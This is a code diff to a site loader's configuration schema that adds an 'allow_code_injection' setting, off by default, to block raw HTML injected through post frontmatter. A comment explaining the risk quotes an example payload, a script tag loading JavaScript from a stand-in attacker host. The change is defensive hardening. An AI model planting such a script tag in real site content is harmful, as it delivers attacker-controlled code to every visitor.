@@ -61,6 +61,14 @@ export const configSchema = z
           .int()
           .nonnegative()
           .default(5 * 1024 * 1024),
+        // `codeinjection_head` / `codeinjection_foot` frontmatter fields inject
+        // raw HTML straight into every rendered page via `{{ghost_head}}` /
+        // `{{ghost_foot}}`. A single PR that adds a post with
+        // `codeinjection_foot: "<script src=//evil.tld/x.js></script>"` would
+        // ship site-wide JS once merged, so the loader ignores these fields by
+        // default. Set to true only if you trust every contributor with write
+        // access to `content/` to add arbitrary HTML/JS.
+        allow_code_injection: z.boolean().default(false),
       })
       .strict()
       .default({}),
